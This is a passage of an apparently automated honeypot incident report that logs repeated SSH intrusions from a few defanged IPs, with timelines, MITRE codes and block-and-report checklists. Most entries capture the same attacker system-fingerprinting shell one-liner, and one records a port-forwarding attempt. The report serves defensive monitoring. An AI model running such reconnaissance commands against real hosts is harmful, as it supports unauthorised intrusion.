| `2026-09-05 11:24:27` | `cowrie.command.input` |
| `2026-09-05 11:24:27` | `cowrie.command.input` |
| `2026-09-05 11:24:27` | `cowrie.command.input` |
| `2026-09-05 11:24:27` | `cowrie.command.input` |
| `2026-09-05 11:24:27` | `cowrie.command.input` |
| `2026-09-05 11:24:27` | `cowrie.command.success` |
| `2026-09-05 11:24:27` | `cowrie.command.input` |
| `2026-09-05 11:24:27` | `cowrie.command.input` |
| `2026-09-05 11:24:27` | `cowrie.command.input` |
| `2026-09-05 11:24:27` | `cowrie.command.input` |
| `2026-09-05 11:24:28` | `cowrie.log.closed` |
| `2026-09-05 11:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab539796212c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:26 |
| **Last Seen** | 2026-09-05 11:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:26:21` | `cowrie.session.connect` |
| `2026-09-05 11:26:21` | `cowrie.client.version` |
| `2026-09-05 11:26:21` | `cowrie.client.kex` |
| `2026-09-05 11:26:23` | `cowrie.login.success` |
| `2026-09-05 11:26:24` | `cowrie.session.params` |
| `2026-09-05 11:26:24` | `cowrie.command.input` |
| `2026-09-05 11:26:24` | `cowrie.command.input` |
| `2026-09-05 11:26:24` | `cowrie.command.input` |
| `2026-09-05 11:26:24` | `cowrie.command.input` |
| `2026-09-05 11:26:24` | `cowrie.command.input` |
| `2026-09-05 11:26:24` | `cowrie.command.success` |
| `2026-09-05 11:26:24` | `cowrie.command.input` |
| `2026-09-05 11:26:24` | `cowrie.command.input` |
| `2026-09-05 11:26:24` | `cowrie.command.input` |
| `2026-09-05 11:26:24` | `cowrie.command.input` |
| `2026-09-05 11:26:25` | `cowrie.log.closed` |
| `2026-09-05 11:26:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78010360d107

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:28 |
| **Last Seen** | 2026-09-05 11:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:28:14` | `cowrie.session.connect` |
| `2026-09-05 11:28:14` | `cowrie.client.version` |
| `2026-09-05 11:28:14` | `cowrie.client.kex` |
| `2026-09-05 11:28:15` | `cowrie.login.success` |
| `2026-09-05 11:28:17` | `cowrie.session.params` |
| `2026-09-05 11:28:17` | `cowrie.command.input` |
| `2026-09-05 11:28:17` | `cowrie.command.input` |
| `2026-09-05 11:28:17` | `cowrie.command.input` |
| `2026-09-05 11:28:17` | `cowrie.command.input` |
| `2026-09-05 11:28:17` | `cowrie.command.input` |
| `2026-09-05 11:28:17` | `cowrie.command.success` |
| `2026-09-05 11:28:17` | `cowrie.command.input` |
| `2026-09-05 11:28:17` | `cowrie.command.input` |
| `2026-09-05 11:28:17` | `cowrie.command.input` |
| `2026-09-05 11:28:17` | `cowrie.command.input` |
| `2026-09-05 11:28:17` | `cowrie.log.closed` |
| `2026-09-05 11:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3ba49fc2179

| Field | Detail |
|---|---|
| **Source IP** | `104.168.94[.]22` |
| **First Seen** | 2026-09-05 11:28 |
| **Last Seen** | 2026-09-05 11:29 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:28:22` | `cowrie.session.connect` |
| `2026-09-05 11:28:25` | `cowrie.client.version` |
| `2026-09-05 11:28:25` | `cowrie.client.kex` |
| `2026-09-05 11:28:44` | `cowrie.login.success` |
| `2026-09-05 11:28:57` | `cowrie.session.params` |
| `2026-09-05 11:28:57` | `cowrie.command.input` |
| `2026-09-05 11:29:02` | `cowrie.log.closed` |
| `2026-09-05 11:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.94[.]22` to AbuseIPDB if not already reported
- [ ] Block `104.168.94[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee4f567a0411

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:30 |
| **Last Seen** | 2026-09-05 11:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:30:05` | `cowrie.session.connect` |
| `2026-09-05 11:30:05` | `cowrie.client.version` |
| `2026-09-05 11:30:05` | `cowrie.client.kex` |
| `2026-09-05 11:30:06` | `cowrie.login.success` |
| `2026-09-05 11:30:08` | `cowrie.session.params` |
| `2026-09-05 11:30:08` | `cowrie.command.input` |
| `2026-09-05 11:30:08` | `cowrie.command.input` |
| `2026-09-05 11:30:08` | `cowrie.command.input` |
| `2026-09-05 11:30:08` | `cowrie.command.input` |
| `2026-09-05 11:30:08` | `cowrie.command.input` |
| `2026-09-05 11:30:08` | `cowrie.command.success` |
| `2026-09-05 11:30:08` | `cowrie.command.input` |
| `2026-09-05 11:30:08` | `cowrie.command.input` |
| `2026-09-05 11:30:08` | `cowrie.command.input` |
| `2026-09-05 11:30:08` | `cowrie.command.input` |
| `2026-09-05 11:30:08` | `cowrie.log.closed` |
| `2026-09-05 11:30:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7c5570bb08c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:31 |
| **Last Seen** | 2026-09-05 11:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:31:51` | `cowrie.session.connect` |
| `2026-09-05 11:31:52` | `cowrie.client.version` |
| `2026-09-05 11:31:52` | `cowrie.client.kex` |
| `2026-09-05 11:31:53` | `cowrie.login.success` |
| `2026-09-05 11:31:55` | `cowrie.session.params` |
| `2026-09-05 11:31:55` | `cowrie.command.input` |
| `2026-09-05 11:31:55` | `cowrie.command.input` |
| `2026-09-05 11:31:55` | `cowrie.command.input` |
| `2026-09-05 11:31:55` | `cowrie.command.input` |
| `2026-09-05 11:31:55` | `cowrie.command.input` |
| `2026-09-05 11:31:55` | `cowrie.command.success` |
| `2026-09-05 11:31:55` | `cowrie.command.input` |
| `2026-09-05 11:31:55` | `cowrie.command.input` |
| `2026-09-05 11:31:55` | `cowrie.command.input` |
| `2026-09-05 11:31:55` | `cowrie.command.input` |
| `2026-09-05 11:31:56` | `cowrie.log.closed` |
| `2026-09-05 11:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acd6f033fd9b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:33 |
| **Last Seen** | 2026-09-05 11:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:33:37` | `cowrie.session.connect` |
| `2026-09-05 11:33:37` | `cowrie.client.version` |
| `2026-09-05 11:33:37` | `cowrie.client.kex` |
| `2026-09-05 11:33:39` | `cowrie.login.success` |
| `2026-09-05 11:33:40` | `cowrie.session.params` |
| `2026-09-05 11:33:40` | `cowrie.command.input` |
| `2026-09-05 11:33:40` | `cowrie.command.input` |
| `2026-09-05 11:33:40` | `cowrie.command.input` |
| `2026-09-05 11:33:40` | `cowrie.command.input` |
| `2026-09-05 11:33:40` | `cowrie.command.input` |
| `2026-09-05 11:33:40` | `cowrie.command.success` |
| `2026-09-05 11:33:40` | `cowrie.command.input` |
| `2026-09-05 11:33:40` | `cowrie.command.input` |
| `2026-09-05 11:33:40` | `cowrie.command.input` |
| `2026-09-05 11:33:40` | `cowrie.command.input` |
| `2026-09-05 11:33:40` | `cowrie.log.closed` |
| `2026-09-05 11:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50949174c884

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:35 |
| **Last Seen** | 2026-09-05 11:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:35:24` | `cowrie.session.connect` |
| `2026-09-05 11:35:24` | `cowrie.client.version` |
| `2026-09-05 11:35:24` | `cowrie.client.kex` |
| `2026-09-05 11:35:25` | `cowrie.login.success` |
| `2026-09-05 11:35:27` | `cowrie.session.params` |
| `2026-09-05 11:35:27` | `cowrie.command.input` |
| `2026-09-05 11:35:27` | `cowrie.command.input` |
| `2026-09-05 11:35:27` | `cowrie.command.input` |
| `2026-09-05 11:35:27` | `cowrie.command.input` |
| `2026-09-05 11:35:27` | `cowrie.command.input` |
| `2026-09-05 11:35:27` | `cowrie.command.success` |
| `2026-09-05 11:35:27` | `cowrie.command.input` |
| `2026-09-05 11:35:27` | `cowrie.command.input` |
| `2026-09-05 11:35:27` | `cowrie.command.input` |
| `2026-09-05 11:35:27` | `cowrie.command.input` |
| `2026-09-05 11:35:27` | `cowrie.log.closed` |
| `2026-09-05 11:35:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5f260a98401

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:37 |
| **Last Seen** | 2026-09-05 11:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:37:26` | `cowrie.session.connect` |
| `2026-09-05 11:37:26` | `cowrie.client.version` |
| `2026-09-05 11:37:26` | `cowrie.client.kex` |
| `2026-09-05 11:37:27` | `cowrie.login.success` |
| `2026-09-05 11:37:29` | `cowrie.session.params` |
| `2026-09-05 11:37:29` | `cowrie.command.input` |
| `2026-09-05 11:37:29` | `cowrie.command.input` |
| `2026-09-05 11:37:29` | `cowrie.command.input` |
| `2026-09-05 11:37:29` | `cowrie.command.input` |
| `2026-09-05 11:37:29` | `cowrie.command.input` |
| `2026-09-05 11:37:29` | `cowrie.command.success` |
| `2026-09-05 11:37:29` | `cowrie.command.input` |
| `2026-09-05 11:37:29` | `cowrie.command.input` |
| `2026-09-05 11:37:29` | `cowrie.command.input` |
| `2026-09-05 11:37:29` | `cowrie.command.input` |
| `2026-09-05 11:37:29` | `cowrie.log.closed` |
| `2026-09-05 11:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c1e96582607

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:39 |
| **Last Seen** | 2026-09-05 11:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:39:29` | `cowrie.session.connect` |
| `2026-09-05 11:39:29` | `cowrie.client.version` |
| `2026-09-05 11:39:29` | `cowrie.client.kex` |
| `2026-09-05 11:39:30` | `cowrie.login.success` |
| `2026-09-05 11:39:31` | `cowrie.session.params` |
| `2026-09-05 11:39:31` | `cowrie.command.input` |
| `2026-09-05 11:39:31` | `cowrie.command.input` |
| `2026-09-05 11:39:31` | `cowrie.command.input` |
| `2026-09-05 11:39:31` | `cowrie.command.input` |
| `2026-09-05 11:39:31` | `cowrie.command.input` |
| `2026-09-05 11:39:31` | `cowrie.command.success` |
| `2026-09-05 11:39:31` | `cowrie.command.input` |
| `2026-09-05 11:39:31` | `cowrie.command.input` |
| `2026-09-05 11:39:31` | `cowrie.command.input` |
| `2026-09-05 11:39:31` | `cowrie.command.input` |
| `2026-09-05 11:39:31` | `cowrie.log.closed` |
| `2026-09-05 11:39:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e163592435a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:41 |
| **Last Seen** | 2026-09-05 11:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:41:32` | `cowrie.session.connect` |
| `2026-09-05 11:41:32` | `cowrie.client.version` |
| `2026-09-05 11:41:32` | `cowrie.client.kex` |
| `2026-09-05 11:41:33` | `cowrie.login.success` |
| `2026-09-05 11:41:35` | `cowrie.session.params` |
| `2026-09-05 11:41:35` | `cowrie.command.input` |
| `2026-09-05 11:41:35` | `cowrie.command.input` |
| `2026-09-05 11:41:35` | `cowrie.command.input` |
| `2026-09-05 11:41:35` | `cowrie.command.input` |
| `2026-09-05 11:41:35` | `cowrie.command.input` |
| `2026-09-05 11:41:35` | `cowrie.command.success` |
| `2026-09-05 11:41:35` | `cowrie.command.input` |
| `2026-09-05 11:41:35` | `cowrie.command.input` |
| `2026-09-05 11:41:35` | `cowrie.command.input` |
| `2026-09-05 11:41:35` | `cowrie.command.input` |
| `2026-09-05 11:41:37` | `cowrie.log.closed` |
| `2026-09-05 11:41:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb0cb0f0c3bb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:43 |
| **Last Seen** | 2026-09-05 11:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:43:46` | `cowrie.session.connect` |
| `2026-09-05 11:43:47` | `cowrie.client.version` |
| `2026-09-05 11:43:47` | `cowrie.client.kex` |
| `2026-09-05 11:43:47` | `cowrie.login.success` |
| `2026-09-05 11:43:48` | `cowrie.session.params` |
| `2026-09-05 11:43:48` | `cowrie.command.input` |
| `2026-09-05 11:43:48` | `cowrie.command.input` |
| `2026-09-05 11:43:48` | `cowrie.command.input` |
| `2026-09-05 11:43:48` | `cowrie.command.input` |
| `2026-09-05 11:43:48` | `cowrie.command.input` |
| `2026-09-05 11:43:48` | `cowrie.command.success` |
| `2026-09-05 11:43:48` | `cowrie.command.input` |
| `2026-09-05 11:43:48` | `cowrie.command.input` |
| `2026-09-05 11:43:48` | `cowrie.command.input` |
| `2026-09-05 11:43:48` | `cowrie.command.input` |
| `2026-09-05 11:43:49` | `cowrie.log.closed` |
| `2026-09-05 11:43:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-163b141016d0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-05 11:44 |
| **Last Seen** | 2026-09-05 11:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:44:54` | `cowrie.session.connect` |
| `2026-09-05 11:44:54` | `cowrie.client.version` |
| `2026-09-05 11:44:54` | `cowrie.client.kex` |
| `2026-09-05 11:44:55` | `cowrie.login.success` |
| `2026-09-05 11:44:55` | `cowrie.direct-tcpip.request` |
| `2026-09-05 11:44:55` | `cowrie.direct-tcpip.data` |
| `2026-09-05 11:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f402323b839d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-05 11:45 |
| **Last Seen** | 2026-09-05 11:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 11:45:51` | `cowrie.session.connect` |
| `2026-09-05 11:45:52` | `cowrie.client.version` |
| `2026-09-05 11:45:52` | `cowrie.client.kex` |
| `2026-09-05 11:45:53` | `cowrie.login.success` |
| `2026-09-05 11:45:54` | `cowrie.session.params` |
| `2026-09-05 11:45:54` | `cowrie.command.input` |
| `2026-09-05 11:45:54` | `cowrie.command.input` |
| `2026-09-05 11:45:54` | `cowrie.command.input` |
| `2026-09-05 11:45:54` | `cowrie.command.input` |
| `2026-09-05 11:45:54` | `cowrie.command.input` |
| `2026-09-05 11:45:54` | `cowrie.command.success` |
